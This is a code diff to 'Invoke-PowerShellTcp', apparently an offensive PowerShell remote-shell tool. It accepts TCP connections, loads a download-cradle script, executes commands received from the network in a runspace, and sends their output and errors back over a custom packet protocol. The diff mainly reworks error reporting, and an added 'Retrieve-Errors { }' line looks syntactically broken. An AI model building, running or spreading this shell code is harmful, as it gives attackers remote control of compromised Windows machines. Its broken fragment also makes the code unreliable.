@@ -93,14 +93,6 @@ function Invoke-PowerShellTcp
             [Parameter(Position = 1)] $Width = 80
         )
         $result = @()
-        $error | % {
-            $result += (@{
-                "msg_type" = "STREAM_EXCEPTION"
-                "data" = ($_|Out-String -Width $Width)
-                })
-        }
-        $error.clear()
-        $result+=(@{ "msg_type" = "STREAM_ERROR"; "data" = $Streams.Error })
         $Streams.Warning | % { $result+=(@{ "msg_type" = "STREAM_WARNING"; "data" = $_.Message }) }
         $Streams.Verbose | % { $result+=(@{ "msg_type" = "STREAM_VERBOSE"; "data" = $_.Message }) }
         $Streams.Debug | % { $result+=(@{ "msg_type" = "STREAM_DEBUG"; "data" = $_.Message }) }
@@ -111,9 +103,17 @@ function Invoke-PowerShellTcp
         $result | ? { $_.data }
     }
 
+    Retrieve-Errors {
+
+    }
+
     function Handle-Packets {
+
         #Create PowerShell object
         $PowerShell = [powershell]::Create()
+        $Runspace = [runspacefactory]::CreateRunspace()
+        $PowerShell.runspace = $Runspace
+        $Runspace.Open()
         [void]$PowerShell.AddScript($DL_CRADLE)
 
         Write-ShellPacket (Get-ShellHello) $stream
@@ -136,10 +136,23 @@ function Invoke-PowerShellTcp
                 [void]$PowerShell.AddScript($data)
                 $output = ( $PowerShell.Invoke() | Out-String -Width $packet.width)
 
-                Write-ShellPacket @{ "msg_type" = "OUTPUT"; "data" = "$output" } $stream
+                #Get errors
+                $PowerShell.Commands.Clear()
+                [void]$PowerShell.AddScript('$error')
+                $script_errors = ( $PowerShell.Invoke()  | Out-String -Width $packet.width )
+                $PowerShell.Commands.Clear()
+                [void]$PowerShell.AddScript('$error.clear()')
+                $PowerShell.Invoke()
+
+                if ($script_errors.length -gt 0) {
+                    Write-ShellPacket @{ "msg_type" = "STREAM_ERROR"; "data" = $script_errors } $stream
+                }
+
                 Get-OutputStreams $PowerShell.Streams $packet.width | % {
                     Write-ShellPacket $_ $stream
                 }
+
+                Write-ShellPacket @{ "msg_type" = "OUTPUT"; "data" = "$output" } $stream
             } elseif ($packet.msg_type -eq "TABCOMPL") {
                 $data = $packet.data
                 $x = ([System.Management.Automation.CommandCompletion]::CompleteInput($data, $data.length, $Null, $PowerShell))
@@ -176,7 +189,6 @@ function Invoke-PowerShellTcp
             $client = $listener.AcceptTcpClient()
         }
 
-        $error.clear()
         $stream = $client.GetStream()
         # this the shell hello
         $stream.Write([byte[]](0x21,0x9e,0x10,0x55,0x75,0x6a,0x1a,0x6b),0,8)
